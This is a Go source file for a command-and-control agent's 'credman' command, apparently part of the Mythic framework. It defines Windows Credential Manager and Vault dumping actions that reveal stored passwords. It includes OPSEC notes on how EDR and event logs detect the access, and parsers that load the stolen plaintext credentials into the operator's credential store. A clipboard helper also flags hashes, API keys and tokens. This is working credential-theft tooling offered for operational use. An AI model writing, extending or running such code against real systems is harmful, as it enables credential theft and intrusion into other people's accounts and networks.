package agentfunctions

import (
	"fmt"
	"path/filepath"
	"strings"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	"github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "credman",
		Description:         "Enumerate Windows Credential Manager entries (saved passwords, domain credentials, vault items)",
		HelpString:          "credman [-action <list|dump|vault>] [-filter <pattern>]",
		Version:             2,
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1555.004"},
		ScriptOnlyCommand:   false,
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
			FilterCommandAvailabilityByAgentBuildParameters: map[string]string{"selected_os": "Windows"},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:             "action",
				ModalDisplayName: "Action",
				CLIName:          "action",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:          []string{"list", "dump", "vault"},
				Description:      "list: show credential targets and usernames. dump: also reveal stored passwords. vault: enumerate Windows Vault (web logins, MS account credentials) — DPAPI auto-decrypts in interactive sessions.",
				DefaultValue:     "list",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
			{
				Name:             "filter",
				ModalDisplayName: "Filter",
				CLIName:          "filter",
				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:      "Optional target name filter (e.g., 'Microsoft*', '*domain*'). Empty = all credentials.",
				DefaultValue:     "",
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						GroupName:           "Default",
					},
				},
			},
		},
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "credman_new.js"),
			Author:     "@galoryber",
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
				action, _ := taskData.Args.GetStringArg("action")
				msg := fmt.Sprintf("OPSEC WARNING: Credential Manager %s. Accesses Windows Credential Manager via CredEnumerate API to read stored credentials (web logins, RDP creds, network passwords). EDR may monitor Credential Manager access patterns.", action)
				if action == "vault" {
					msg = "OPSEC WARNING: Credential Manager vault. Calls vaultcli.dll (VaultEnumerateVaults / VaultOpenVault / VaultGetItem) to enumerate Windows Vault stores (web logins, Microsoft account sign-ins, Passport). VaultGetItem auto-decrypts via DPAPI under the calling user — only works in an interactive logon session. EDRs that hook vaultcli or watch the Microsoft-Windows-VaultSvc ETW provider will surface every call. Each retrieved item also writes to the user's vault audit log."
				}
				return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
					TaskID:             taskData.Task.ID,
					Success:            true,
					OpsecPreBlocked:    false,
					OpsecPreMessage:    msg,
					OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
				}
			},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    "OPSEC AUDIT: Credential Manager accessed. Windows logs Credential Manager access in Event ID 5379/5381/5382. Defender Credential Guard (if enabled) may block access to certain credentials. Accessed credentials should be tested promptly and rotated by defenders.",
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")
			display := fmt.Sprintf("%s", action)
			response.DisplayParams = &display
			if action == "vault" {
				createArtifact(taskData.Task.ID, "API Call", "vaultcli.dll: VaultEnumerateVaults / VaultOpenVault / VaultEnumerateItems / VaultGetItem")
			} else {
				createArtifact(taskData.Task.ID, "API Call", fmt.Sprintf("CredEnumerateW credential enumeration — %s", action))
			}
			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
			source := "credman"
			if strings.Contains(responseText, "=== Windows Vault Enumeration") {
				creds = parseCredmanVaultBlocks(responseText)
				source = "credman vault"
			} else {
				creds = parseCredmanBlocks(responseText)
			}
			registerCredentials(processResponse.TaskData.Task.ID, creds)
			if len(creds) > 0 {
				logOperationEvent(processResponse.TaskData.Task.ID,
					fmt.Sprintf("[CREDENTIAL] %s extracted %d credentials from %s", source, len(creds), processResponse.TaskData.Callback.Host), true)
			}
			return response
		},
	})
}

// parseCredmanBlocks parses credman output blocks and extracts credential entries.
// Format: --- target ---\n  Type: ...\n  Username: ...\n  Password: ...
func parseCredmanBlocks(responseText string) []mythicrpc.MythicRPCCredentialCreateCredentialData {
	var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
	blocks := strings.Split(responseText, "--- ")
	for _, block := range blocks {
		if block == "" || strings.HasPrefix(block, "Summary:") {
			continue
		}
		lines := strings.Split(block, "\n")
		if len(lines) < 2 {
			continue
		}
		target := strings.TrimSuffix(strings.TrimSpace(lines[0]), " ---")
		var username, password, typeName string
		for _, line := range lines[1:] {
			trimmed := strings.TrimSpace(line)
			if strings.HasPrefix(trimmed, "Username:") {
				username = strings.TrimSpace(strings.TrimPrefix(trimmed, "Username:"))
			} else if strings.HasPrefix(trimmed, "Password:") {
				password = strings.TrimSpace(strings.TrimPrefix(trimmed, "Password:"))
			} else if strings.HasPrefix(trimmed, "Type:") {
				typeName = strings.TrimSpace(strings.TrimPrefix(trimmed, "Type:"))
			}
		}
		if username != "" && password != "" {
			creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
				CredentialType: "plaintext",
				Realm:          target,
				Account:        username,
				Credential:     password,
				Comment:        fmt.Sprintf("credman dump (%s)", typeName),
			})
		}
	}
	return creds
}

// parseCredmanVaultBlocks parses `credman -action vault` output and extracts
// credential entries. The agent emits a header followed by `[#N] ...` items
// inside `--- Vault: <name> {GUID} ---` sections; we walk the lines and pair
// Identity + Authenticator + Resource per item.
//
// Skips items whose authenticator is `[protected, decryption requires
// interactive user context]` — those are present-but-unreadable in the
// agent's session.
func parseCredmanVaultBlocks(responseText string) []mythicrpc.MythicRPCCredentialCreateCredentialData {
	var creds []mythicrpc.MythicRPCCredentialCreateCredentialData
	var (
		curVaultName, schema, resource, identity, authenticator string
	)
	flush := func() {
		if identity != "" && authenticator != "" && !strings.HasPrefix(authenticator, "[protected") {
			realm := resource
			if realm == "" {
				realm = curVaultName
			}
			creds = append(creds, mythicrpc.MythicRPCCredentialCreateCredentialData{
				CredentialType: "plaintext",
				Realm:          realm,
				Account:        identity,
				Credential:     authenticator,
				Comment:        fmt.Sprintf("vault %s (%s)", curVaultName, schema),
			})
		}
		schema, resource, identity, authenticator = "", "", "", ""
	}
	for _, line := range strings.Split(responseText, "\n") {
		trimmed := strings.TrimSpace(line)
		switch {
		case strings.HasPrefix(trimmed, "--- Vault:"):
			flush()
			// "--- Vault: <name> {GUID} ---"
			rest := strings.TrimSuffix(strings.TrimPrefix(trimmed, "--- Vault:"), "---")
			rest = strings.TrimSpace(rest)
			if idx := strings.LastIndex(rest, "{"); idx > 0 {
				curVaultName = strings.TrimSpace(rest[:idx])
			} else {
				curVaultName = rest
			}
		case strings.HasPrefix(trimmed, "[#"):
			flush()
			// "[#N] Schema: <name>"
			if idx := strings.Index(trimmed, "Schema:"); idx >= 0 {
				schema = strings.TrimSpace(trimmed[idx+len("Schema:"):])
			}
		case strings.HasPrefix(trimmed, "Resource:"):
			resource = strings.TrimSpace(strings.TrimPrefix(trimmed, "Resource:"))
		case strings.HasPrefix(trimmed, "Identity:"):
			identity = strings.TrimSpace(strings.TrimPrefix(trimmed, "Identity:"))
		case strings.HasPrefix(trimmed, "Authenticator:"):
			authenticator = strings.TrimSpace(strings.TrimPrefix(trimmed, "Authenticator:"))
		case strings.HasPrefix(trimmed, "Summary:"):
			flush()
		}
	}
	flush()
	return creds
}

// detectClipboardCredentialPatterns returns credential pattern tags found in clipboard data.
func detectClipboardCredentialPatterns(text string) []string {
	var found []string
	for _, tag := range []string{"NTLM Hash", "NT Hash", "Password-like", "API Key", "AWS Key", "Private Key", "Bearer Token"} {
		if strings.Contains(text, tag) {
			found = append(found, tag)
		}
	}
	return found
}
